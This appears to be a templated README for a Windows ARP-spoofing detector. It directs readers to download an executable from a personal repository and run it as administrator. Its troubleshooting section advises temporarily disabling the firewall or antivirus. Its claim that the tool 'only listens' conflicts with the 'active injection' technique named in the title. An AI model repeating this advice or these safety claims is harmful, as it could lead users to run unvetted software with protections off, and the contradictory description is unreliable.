# 🛡️ -ARP-Spoofing-Detection-Active-Injection-Technique - Real-Time Network Attack Detector

[![Download Now](https://img.shields.io/badge/Download-ARP_Spoofing_Tool-brightgreen.svg)](https://github.com/xbxh6452/-ARP-Spoofing-Detection-Active-Injection-Technique)

## Project Overview

This application detects ARP spoofing attacks on your local network. It works in real time by watching network traffic. It is built using low-level C programming, raw sockets, and the libpcap library. The method is based on a known academic technique named "Detecting ARP Spoofing: An Active Technique" by Ramachandran & Nandi (2005).

You do not need programming skills to use this software. This guide walks you through the steps to download, install, and run it on a Windows computer.

## 📋 What Is ARP Spoofing?

ARP (Address Resolution Protocol) links IP addresses to hardware addresses on a local network. ARP spoofing tricks your computer into sending network data to the wrong device. Attackers use this to intercept or modify your data.

This program helps you defend your network by spotting such attacks as they happen.

## 🖥️ System Requirements

- A Windows 10 or newer PC
- Admin rights to install software and run network tools
- At least 2 GB of free RAM
- Around 50 MB of free disk space for installation
- Network connection using Ethernet (recommended for best results)
- WinPcap or Npcap installed (libpcap equivalent for Windows)

## 🛠️ Setup Requirements

Before running the program, you need to install libpcap support for Windows. This is done through Npcap, a free library that allows you to capture low-level network packets.

Download and install Npcap from here: https://nmap.org/npcap/

Choose the default options during Npcap installation. This software must be installed for the ARP spoofing tool to work as expected.

## 🚀 Getting Started: Download and Install

[![Download Here](https://img.shields.io/badge/Get%20Software-Download-blueviolet.svg)](https://github.com/xbxh6452/-ARP-Spoofing-Detection-Active-Injection-Technique)

1.  Open your web browser and visit the download page:

    https://github.com/xbxh6452/-ARP-Spoofing-Detection-Active-Injection-Technique

2.  On the GitHub page, look for the **Releases** or **Downloads** section.

3.  Download the latest Windows release file. This will usually be a `.zip` or `.exe` file.

4.  Save the file to a folder you can access easily, such as your Desktop or Downloads folder.

5.  If the file is compressed (`.zip`), right-click and select **Extract All**. Choose a folder for the extracted files.

6.  Find the program file inside the extracted folder. It may be named something like `ARP_Spoofing_Detector.exe`.

7.  Right-click the program file and select **Run as administrator** to start the tool. Administrator rights are required to access network data.

## ⚙️ How to Use the Program

Once the program opens, it will begin to monitor your network traffic automatically.

- The interface shows ARP requests and replies in real time.
- It flags suspicious activity that matches known ARP spoofing patterns.
- Alerts appear if a device sends conflicting ARP messages.
- You can stop monitoring by closing the window or pressing the provided stop button.

The program logs events locally in a file named `arp_spoof_log.txt`. You can open this file with any text editor to review detected events.

## 📁 Where to Find Log Files

After running the program, you may want to check what the software has detected.

- Open the folder where you saved the program.
- Look for `arp_spoof_log.txt`.
- Double-click the file to open it with Notepad or another text editor.
  
This file contains timestamps and details of any suspicious ARP activity detected on your network.

## 🔧 Troubleshooting Tips

- If the program does not start, make sure you ran it as administrator.
- Check that Npcap is installed and that you selected the "WinPcap Compatible Mode" option during its setup.
- Disable any firewall or antivirus temporarily if they block network access.
- Use an Ethernet connection rather than Wi-Fi for better detection accuracy.
- Restart your computer if the network adapter is not detected.

## 🚩 Common Questions

**Q: Do I need any programming skills?**
  
No. The program runs with a simple interface and alerts you directly.

**Q: Can I use it on Mac or Linux?**

This version is designed only for Windows.

**Q: Is it safe to run?**

Yes. The tool only listens to network packets; it does not modify any data.

**Q: Does it require internet access?**

No. It works on your local network only.

## ⚙️ How It Works: Simple Explanation

The software watches the ARP traffic on your network. ARP normally matches device IP addresses to their hardware addresses.

If a device sends false information, the tool catches it by checking if two different hardware addresses claim the same IP.

If it finds a match, it alerts you about a possible spoofing attempt.

## 🔐 Network Security Tips

- Use strong passwords on your Wi-Fi.
- Enable encryption like WPA2 or WPA3 on routers.
- Regularly update your router’s firmware.
- Keep your operating system and software updated.
- Avoid using open Wi-Fi networks without a VPN.

## 🔗 Useful Links

- Download the software again here: https://github.com/xbxh6452/-ARP-Spoofing-Detection-Active-Injection-Technique  
- Npcap network capture library: https://nmap.org/npcap/  
- Learn more about ARP Spoofing: https://en.wikipedia.org/wiki/ARP_spoofing

## 🏷️ Tags

arp-spoofing, c, cyber-defense, cybersecurity, cybersecurity-education, data-structure, libpcap, low-level-programming, network-programming, network-security, raw-sockets